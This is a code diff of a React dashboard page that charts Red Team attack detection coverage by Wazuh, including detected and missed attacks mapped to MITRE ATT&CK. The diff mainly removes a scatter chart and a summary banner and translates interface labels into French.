+                    innerRadius={62}
+                    outerRadius={100}
+                    paddingAngle={1}
+                    stroke={dark ? "#0a0a0a" : "white"}
+                    strokeWidth={2}
+                    isAnimationActive
+                    animationBegin={0}
+                    animationDuration={1000}
+                  >
+                    {detectedByTool.map((d, i) => (
+                      <Cell key={i} fill={TOOL_COLORS[d.name] ?? "#888"} />
+                    ))}
+                  </Pie>
+                </PieChart>
+              </ResponsiveContainer>
+              {/* Center label */}
+              <div className="pointer-events-none absolute inset-0 flex flex-col items-center justify-center">
+                <p className="font-mono text-2xl font-bold tabular-nums text-slate-900 dark:text-coffee-bean-50">{totalDetected}</p>
+                <p className="font-mono text-[10px] uppercase tracking-[0.2em] text-slate-400 dark:text-coffee-bean-200/45">Détectées</p>
+              </div>
+            </div>
+
+            {/* Side legend */}
+            <div className="flex flex-col gap-2">
+              {detectedByTool.map((d) => {
+                const color = TOOL_COLORS[d.name] ?? "#888";
+                return (
+                  <div key={d.name} className="flex items-center gap-2.5">
+                    <span className="size-3 shrink-0 rounded-full" style={{ backgroundColor: color }} />
+                    <span className="flex-1 truncate font-mono text-xs capitalize text-slate-700 dark:text-coffee-bean-100">{d.name}</span>
+                    <span className="font-mono text-[10px] tabular-nums text-slate-400 dark:text-coffee-bean-200/45">{d.attacks}</span>
+                  </div>
+                );
+              })}
+            </div>
           </div>
-          <div className="mt-3 flex flex-wrap gap-x-5 gap-y-1.5">
-            <p className="mb-1 w-full font-mono text-[9px] uppercase tracking-widest text-slate-400 dark:text-coffee-bean-200/30">Légende — Taille = nb attaques · Bordure = statut</p>
-            <span className="flex items-center gap-1.5 font-mono text-[10px] text-slate-500 dark:text-coffee-bean-200/50">
-              <span className="size-2.5 rounded-full border border-green-600 bg-green-100 dark:border-green-500 dark:bg-green-500/20" />Détecté (100%)
-            </span>
-            <span className="flex items-center gap-1.5 font-mono text-[10px] text-slate-500 dark:text-coffee-bean-200/50">
-              <span className="size-2.5 rounded-full border border-red-500 bg-red-100 dark:bg-red-500/20" />Non détecté (0%)
-            </span>
-            <span className="flex items-center gap-1.5 font-mono text-[10px] text-slate-500 dark:text-coffee-bean-200/50">
-              <span className="size-2.5 rounded-full bg-slate-300 dark:bg-white/20" />Couleur = outil
-            </span>
-          </div>
-        </Card>
+            );
+          })()}
+        </div>
       </div>
 
       {/* ── Gate ───────────────────────────────────────────────────────────── */}
@@ -812,46 +783,13 @@ export default function Coverage() {
               </div>
             </div>
 
-            {/* Scatter chart */}
-            <div className="rounded-2xl border border-slate-200 bg-white p-5 shadow-sm dark:border-white/[0.06] dark:bg-black/20 dark:shadow-none dark:backdrop-blur-sm">
-              <p className="mb-4 font-mono text-[10px] uppercase tracking-[0.3em] text-slate-400 dark:text-coffee-bean-200/35">Vue Cartographique — Délai vs Sévérité Wazuh</p>
-              <div className="h-52">
-                <ResponsiveContainer width="100%" height="100%">
-                  <ScatterChart margin={{ top: 20, right: 30, left: 10, bottom: 10 }}>
-                    <CartesianGrid strokeDasharray="3 3" stroke={grid} />
-                    <XAxis dataKey="delay" type="number" domain={[0, 120]}
-                      stroke={axis} tick={{ fill: tick, fontSize: 10, fontFamily: "JetBrains Mono" }}
-                      label={{ value: "Délai de détection (s)", position: "insideBottom", fill: lbl, fontSize: 10, fontFamily: "JetBrains Mono", dy: 10 }} />
-                    <YAxis dataKey="severity" type="number" domain={[0.5, 4.5]}
-                      ticks={[1, 2, 3, 4]} tickFormatter={(v) => SEVERITY_LABEL[v] ?? ""}
-                      stroke={axis} tick={{ fill: tick, fontSize: 9, fontFamily: "JetBrains Mono" }} />
-                    <ZAxis range={[1, 1]} />
-                    <Tooltip content={<ScatterTooltip />} />
-                    <ReferenceLine x={120} stroke="#ef4444" strokeDasharray="4 4"
-                      label={{ value: "120s", position: "top", fill: "#ef4444", fontSize: 9, fontFamily: "JetBrains Mono" }} />
-                    <Scatter data={DEMO_SCATTER} shape={<ScatterDot />} />
-                  </ScatterChart>
-                </ResponsiveContainer>
-              </div>
-              <div className="mt-3 flex flex-wrap items-center gap-x-5 gap-y-1.5">
-                <p className="mb-1 w-full font-mono text-[9px] uppercase tracking-widest text-slate-400 dark:text-coffee-bean-200/30">Légende — Outils Red Team</p>
-                {Object.entries(TOOL_COLORS).filter(([t]) => DEMO_SCATTER.some((d) => d.tool === t)).map(([tool, color]) => (
-                  <span key={tool} className="flex items-center gap-1.5 font-mono text-[10px] text-slate-500 dark:text-coffee-bean-200/50">
-                    <span className="size-2.5 rounded-full" style={{ backgroundColor: color }} />{tool}
-                  </span>
-                ))}
-                <span className="ml-auto flex items-center gap-1.5 font-mono text-[10px] text-slate-400 dark:text-coffee-bean-200/30">
-                  <span className="inline-block h-px w-6 border-t border-dashed border-red-500" />Fenêtre 120s
-                </span>
-              </div>
-            </div>
 
             {/* Detected table */}
             <div className="relative overflow-hidden rounded-2xl border border-green-100 bg-white shadow-sm dark:border-green-500/10 dark:bg-black/20 dark:shadow-none dark:backdrop-blur-sm">
               <div className="absolute inset-x-0 top-0 h-0.5 bg-gradient-to-r from-transparent via-green-400 to-transparent dark:via-green-500/25" />
               <div className="border-b border-slate-100 px-5 py-3 dark:border-white/[0.05]">
                 <div className="flex items-center justify-between">
-                  <p className="font-mono text-[10px] uppercase tracking-[0.3em] text-slate-400 dark:text-coffee-bean-200/35">Preuves de détection — {detected.length} corrélations</p>
+                  <p className="font-cinematic text-base uppercase tracking-[0.2em] text-slate-900 dark:text-coffee-bean-50">Preuves de détection — {detected.length} corrélations</p>
                   <div className="flex items-center gap-1.5 font-mono text-[9px] uppercase tracking-widest text-slate-400 dark:text-coffee-bean-200/25"><Eye size={10} />Cliquer pour voir</div>
                 </div>
               </div>
@@ -868,7 +806,7 @@ export default function Coverage() {
                 </table>
               </div>
               <div className="border-t border-slate-100 px-5 py-2.5 dark:border-white/[0.04]">
-                <p className="font-mono text-[9px] uppercase tracking-widest text-slate-300 dark:text-coffee-bean-200/20">Corrélation MITRE ATT&CK — fenêtre 120s — {detected.length}/{kpi.totalAttacks} matchées</p>
+                <p className="font-mono text-[9px] uppercase tracking-widest text-slate-300 dark:text-coffee-bean-200/20">Corrélation MITRE ATT&CK — fenêtre 120s — {detected.length}/{kpi.totalAttacks} corrélées</p>
               </div>
             </div>
           </section>
@@ -886,10 +824,10 @@ export default function Coverage() {
               </div>
               <div className="flex items-center gap-3">
                 <span className="inline-flex items-center gap-2 rounded-xl border border-red-200 bg-red-50 px-4 py-2 font-mono text-xs text-red-600 dark:border-red-500/25 dark:bg-red-500/[0.08] dark:text-red-400">
-                  <AlertCircle size={13} />{noRuleCount} NO RULE
+                  <AlertCircle size={13} />{noRuleCount} SANS RÈGLE
                 </span>
                 <span className="inline-flex items-center gap-2 rounded-xl border border-orange-200 bg-orange-50 px-4 py-2 font-mono text-xs text-orange-600 dark:border-orange-500/25 dark:bg-orange-500/[0.08] dark:text-orange-400">
-                  <Clock size={13} />{timeoutCount} TIMEOUT
+                  <Clock size={13} />{timeoutCount} DÉLAI DÉPASSÉ
                 </span>
               </div>
             </div>
@@ -901,7 +839,7 @@ export default function Coverage() {
                     <AlertCircle size={17} className="text-red-600 dark:text-red-400" />
                   </div>
                   <div>
-                    <p className="font-mono text-[10px] uppercase tracking-widest text-red-600 dark:text-red-400">NO RULE</p>
+                    <p className="font-mono text-[10px] uppercase tracking-widest text-red-600 dark:text-red-400">SANS RÈGLE</p>
                     <p className="mt-1 font-mono text-2xl font-bold text-red-700 dark:text-red-300">{noRuleCount} attaques</p>
                     <p className="mt-2 font-mono text-[11px] leading-relaxed text-slate-500 dark:text-coffee-bean-200/50">Wazuh ne possède aucune règle pour ces techniques. L'attaque est invisible — aucun log analysé.</p>
                   </div>
@@ -913,7 +851,7 @@ export default function Coverage() {
                     <Clock size={17} className="text-orange-600 dark:text-orange-400" />
                   </div>
                   <div>
-                    <p className="font-mono text-[10px] uppercase tracking-widest text-orange-600 dark:text-orange-400">TIMEOUT</p>
+                    <p className="font-mono text-[10px] uppercase tracking-widest text-orange-600 dark:text-orange-400">DÉLAI DÉPASSÉ</p>
                     <p className="mt-1 font-mono text-2xl font-bold text-orange-700 dark:text-orange-300">{timeoutCount} attaques</p>
                     <p className="mt-2 font-mono text-[11px] leading-relaxed text-slate-500 dark:text-coffee-bean-200/50">Alerte générée après la fenêtre de 120s. La règle existe — c'est la latence de détection qui pose problème.</p>
                   </div>
@@ -938,13 +876,13 @@ export default function Coverage() {
             <div className="relative overflow-hidden rounded-2xl border border-red-100 bg-white shadow-sm dark:border-red-500/10 dark:bg-black/20 dark:shadow-none dark:backdrop-blur-sm">
               <div className="absolute inset-x-0 top-0 h-0.5 bg-gradient-to-r from-transparent via-red-400 to-transparent dark:via-red-500/30" />
               <div className="border-b border-slate-100 px-5 py-3 dark:border-white/[0.05]">
-                <p className="font-mono text-[10px] uppercase tracking-[0.3em] text-slate-400 dark:text-coffee-bean-200/35">Attaques — Angles Morts — {missed.length} non détectées</p>
+                <p className="font-cinematic text-base uppercase tracking-[0.2em] text-slate-900 dark:text-coffee-bean-50">Attaques — Angles Morts — {missed.length} non détectées</p>
               </div>
               <div className="overflow-x-auto">
                 <table className="w-full">
                   <thead>
                     <tr className="border-b border-slate-100 dark:border-white/[0.04]">
-                      {["ID", "Heure", "Outil", "Technique MITRE", "Commande", "Tentatives", "Raison du miss"].map((h) => (
+                      {["ID", "Heure", "Outil", "Technique MITRE", "Commande", "Tentatives", "Raison de l'échec"].map((h) => (
                         <th key={h} className="py-2.5 px-3 text-left font-mono text-[9px] uppercase tracking-[0.25em] text-slate-400 first:pl-5 last:pr-5 dark:text-coffee-bean-200/25">{h}</th>
                       ))}
                     </tr>
@@ -954,39 +892,12 @@ export default function Coverage() {
               </div>
               <div className="border-t border-slate-100 px-5 py-2.5 dark:border-white/[0.04]">
                 <p className="font-mono text-[9px] uppercase tracking-widest text-slate-300 dark:text-coffee-bean-200/20">
-                  {noRuleCount} × règle manquante — {timeoutCount} × alerte tardive — fenêtre 120s
+                  {noRuleCount} × règle manquante — {timeoutCount} × délai dépassé — fenêtre 120s
                 </p>
               </div>
             </div>
           </section>
 
-          {/* ── Summary Banner ──────────────────────────────────────────────── */}
-          <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.6 }}
-            className="rounded-2xl border border-slate-200 bg-slate-50 p-6 shadow-sm dark:border-white/[0.06] dark:bg-gradient-to-br dark:from-night-bordeaux-950/40 dark:to-pitch-black-950/20 dark:shadow-none dark:backdrop-blur-sm">
-            <div className="flex flex-col gap-5 sm:flex-row sm:items-center sm:justify-between">
-              <div className="grid grid-cols-4 gap-6">
-                {[
-                  { label: "Score global",   value: `${kpi.coverage}%`,   cls: "text-green-600 dark:text-green-400" },
-                  { label: "Angles morts",   value: missed.length,        cls: "text-red-600 dark:text-red-400" },
-                  { label: "MTTD moyen",     value: `${kpi.mttdAvg}s`,    cls: "text-blue-600 dark:text-blue-400" },
-                  { label: "Durée exercice", value: kpi.exerciseDuration, cls: "text-purple-600 dark:text-purple-400" },
-                ].map((s) => (
-                  <div key={s.label}>
-                    <p className="font-mono text-[9px] uppercase tracking-widest text-slate-400 dark:text-coffee-bean-200/30">{s.label}</p>
-                    <p className={`mt-1 font-mono text-2xl font-bold ${s.cls}`}>{s.value}</p>
-                  </div>
-                ))}
-              </div>
-              <div className="flex shrink-0 gap-3">
-                <button className="rounded-xl border border-slate-200 bg-white px-5 py-2.5 font-mono text-[11px] uppercase tracking-widest text-slate-600 shadow-sm transition-all hover:bg-slate-50 hover:shadow-md dark:border-white/10 dark:bg-white/5 dark:text-coffee-bean-200/55 dark:shadow-none dark:hover:bg-white/10">
-                  📋 Checklist
-                </button>
-                <button className="rounded-xl border border-red-200 bg-red-50 px-5 py-2.5 font-mono text-[11px] uppercase tracking-widest text-red-600 shadow-sm transition-all hover:bg-red-100 hover:shadow-md dark:border-night-bordeaux-500/40 dark:bg-night-bordeaux-500/10 dark:text-night-bordeaux-300 dark:shadow-none dark:hover:bg-night-bordeaux-500/20 dark:hover:shadow-[0_0_20px_-4px_rgba(196,59,59,0.4)]">
-                  📥 Export PDF
-                </button>
-              </div>
-            </div>
-          </motion.div>
         </>
       )}
     </div>
